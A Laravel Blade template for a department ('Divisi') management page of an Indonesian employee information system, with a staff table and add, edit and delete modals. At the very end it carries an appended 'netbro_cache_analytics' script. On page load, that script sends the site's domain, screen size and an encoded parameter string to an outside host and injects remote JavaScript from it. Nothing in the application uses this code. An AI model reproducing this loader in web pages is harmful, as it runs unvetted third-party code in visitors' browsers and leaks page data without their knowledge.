<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="shortcut icon" href="/image/favicon.png">
  <title>Divisi</title>
  <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/datatables/css/dataTables.bootstrap.min.css"/>

  <!-- CSS -->
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
  <!-- Toastr untuk notifikasi -->
  <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet">

  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/jqvmap/jqvmap.min.css"/>
  <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>

 <!-- Wrapper Start -->
 <div class="be-wrapper">

  <!--  Sidebar Start -->  
  <div class="be-wrapper be-fixed-sidebar">
    @include('Beranda.sidebar')
  </div>
  <!--  Sidebar End --> 

  <!--   Content Start  -->
  <div class="be-wrapper be-fixed-sidebar">
    <div class="be-content be-icons-list">
      <div class="page-head">
        <h2 class="page-head-title">Divisi</h2>
      </div>     
      <div class="main-content container-fluid">

        <!--  Header Tabel Divisi Start -->
        <div class="panel panel-default panel-table">
         <div class="panel-body">
          <div class="panel-heading">Tabel Divisi
            <div id="tambahdivisi" style="float: right; margin: 0 0 0 0;">

            </div>
          </div>
          <!--  Header Tabel Divisi End -->
          <!-- Table Divisi Start -->
          <div  class="table-responsive noSwipe">
            <table id="table1" class="table table-striped table-hover table-fw-widget">
              <thead>
                <tr>
                  <th width="100px">Nama Divisi</th>
                  <th width="100px">NIK Ketua Divisi</th>
                  <th width="100px">Nama Ketua Divisi</th>
                  <th width="100px">Email</th> 
                  <th width="100px"><button data-toggle="modal" data-target="#tambah_divisi" type="button" class="btn btn-space btn-primary">Tambah Divisi</button>
                  </th>
                </tr>
              </thead>
              <tbody>
               @foreach($divisi as $divisi)
               <tr class="odd gradeA">
                <td>{{$divisi['nama_divisi']}}</td>
                @php
                $data0 = preg_split('/\,/', $divisi['nik']);
                $data1 = preg_split('/\,/', $divisi['nama_atasan']);
                $data2 = preg_split('/\,/', $divisi['email']);
                $count_data = count($data1);
                $i = 0; $j = 0; $k = 0;
                @endphp

                @if($count_data > 1) 
                <td>
                  @while($k < $count_data)
                  {{$data0[$k]}}<br>
                  @php
                  $k++;
                  @endphp
                  @endwhile
                </td>
                <td>
                  @while($i < $count_data)
                  {{$data1[$i]}}<br>
                  @php
                  $i++;
                  @endphp
                  @endwhile
                </td>
                <td>
                  @while($j < $count_data)
                  {{$data2[$j]}}<br>
                  @php
                  $j++;
                  @endphp
                  @endwhile
                </td>

                @else 
                <td>{{$data0[0]}}</td>
                <td>{{$data1[0]}}</td>
                <td>{{$data2[0]}}</td>
                @endif
                <td>
                 <a href=""></a> <button data-toggle="modal" data-target="#edit-{{$divisi['id_divisi']}}" type="button" class="btn btn-space btn-warning">Edit</button>
                 <button data-toggle="modal" data-target="#hapus-{{$divisi['id_divisi']}}" type="button" class="btn btn-space btn-danger"> Hapus </button>
               </td>

               <!-- Modals untuk Hapus -->
               <div id="hapus-{{$divisi['id_divisi']}}" tabindex="-1" role="dialog" class="modal fade">
                <div class="modal-dialog">
                  <div class="modal-content">
                    <div class="modal-header">
                      <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                    </div>
                    <div class="modal-body">
                      <div class="text-center">
                        <div class="text-danger"><span class="modal-main-icon mdi mdi-close-circle-o"></span></div>
                        <h3>Apakah Anda yakin untuk menghapus data ini ?</h3>
                        <div class="xs-mt-50">
                          <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                          <a href="/divisi/{{$divisi['id_divisi']}}/delete"><button type="button" class="btn btn-space btn-danger">Hapus</button></a>
                        </div>
                      </div>
                    </div>
                    <div class="modal-footer"></div>
                  </div>
                </div>
              </div>
              <!--Akhir dari Modals Hapus -->

              <!-- Modal Edit Divisi -->
              <div id="edit-{{$divisi['id_divisi']}}" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
                <div class="modal-dialog">
                  <div class="modal-content">
                    <div class="modal-header">
                      <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                      <h3 class="modal-title">Edit Divisi</h3>
                    </div>
                    <form action="/divisi/{{$divisi['id_divisi']}}/update" method="POST">
                      {{ csrf_field()}}
                      <div class="modal-body">
                        <div class="form-group">
                          <label>Nama Divisi</label>
                          <input value="{{$divisi['nama_divisi']}}" id="nama_divisi" name="nama_divisi" type="text" class="form-control" required="" onBlur="checknikAvailability()">
                          <!-- <span id="error_nik"></span> -->
                        </div>
                        <div class="form-group">
                          <label>NIK Ketua Divisi</label>
                          <input value="{{$divisi['nik']}}" name="nik" type="text" class="form-control" required="">
                        </div>

                        <div class="modal-footer">
                          <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                          <button type="submit"  class="btn btn-primary">Simpan</button>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
              </div> 
              <!--Akhir dari Modals Edit -->

            </tr>
            @endforeach    
          </tbody>
        </table>
      </div>
    </div>
  </div>
  <!-- Table Divisi End -->

  <!--  Modal Tambah Divisi Awal -->
  <div id="tambah_divisi" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
   <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header ">
        <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button> 
        <div class="text"><h3>Tambah Divisi</h3></div>
      </div>
      <div class="modal-body">        
        <form id="form_submit_edit" name="submit1" action="/divisi/tambah_divisi" method="POST" enctype="multipart/form-data">
          {{csrf_field()}}
          <div class="modal-body">
            <div class="form-group">
              <label>Nama Divisi</label>
              <input name="nama_divisi" type="text" class="form-control" required="">
            </div>
            <div class="form-group">
              <label>NIK Ketua Divisi</label>
              <input id="nik" name="nik" type="text" class="form-control" required="" onBlur="checknikAvailability()">
              <span id="error_nik"></span>
            </div>                        
          </div>
          <div class="xs-mt-25" style="float: right;">
            <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
            <button type="submit" class="btn btn-space btn-primary">Tambah</button>
          </div>
        </form>
      </div>
      <div class="modal-footer"></div>
    </div>
  </div>
</div>
<!--  Modal Tambah Divisi Akhir -->

</div>
</div>
</div>
<!--   Content End  -->

</div>
<!--  Wrapper End -->   

<!--Footer --> 
<div class="text-center">
  <div class="credits">
    <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
  </div>
</div>
<!-- Footer End -->

<!--  Inisialisasi Java Script -->

<!-- Script Toastr untuk notifikasi-->
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

<script>
  @if (Session::has('message'))
  var type = "{{Session::get('alert-type','info')}}";
  toastr.options = {
    "debug": false,
    "onclick": null,
    "fadeIn": 300,
    "fadeOut": 1000,
    "timeOut": 5000,
    "extendedTimeOut": 1000
  }

  switch(type)
  {
    case 'info':
    toastr.info("{{Session::get('message')}}");
    break;

    case 'success':
    toastr.success("{{Session::get('message')}}");
    break;

    case 'warning':
    toastr.warning("{{Session::get('message')}}");
    break;

    case 'error':
    toastr.error("{{Session::get('message')}}");
    break;
  }

  @endif

</script>

<script src="assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="assets/js/main.js" type="text/javascript"></script>
<script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
<script src="assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
<script src="assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>

<script type="text/javascript">
  $(document).ready(function(){
        //initialize the javascript
        App.init();
        App.dataTables();
      });
    </script>

    <script type="text/javascript">
      document.getElementById("status").onchange = function () {
        document.getElementById("alasan").setAttribute("disabled", "disabled");
        document.getElementById("tgl_resign").setAttribute("disabled", "disabled");
        if (this.value == 'Resign')
          document.getElementById("alasan").removeAttribute("disabled");
        if (this.value == 'Resign')
          document.getElementById("tgl_resign").removeAttribute("disabled");
      };

      // Fungsi Logout

      $(function(){
        $('a#logout').click(function(){
          if(confirm('Apakah anda yakin ingin keluar ?')) {
            return true;
          }

          return false;
        });
      });


      // Fungsi Menu dashboard

      $(document).ready(function(){

        App.init();
        App.dashboard();

      });
    </script>

    <script type="text/javascript">
      if (self == top) {
        function netbro_cache_analytics(fn, callback) {
          setTimeout(function() {
            fn();
            callback();
          }, 0);
        }

        function sync(fn) {
          fn();
        }

        function requestCfs() {
          var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
          var idc_glo_r = Math.floor(Math.random() * 99999999999);
          var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
          var bsa = document.createElement('script');
          bsa.type = 'text/javascript';
          bsa.async = true;
          bsa.src = url;
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
      };

    </script>


  </body>
  </html>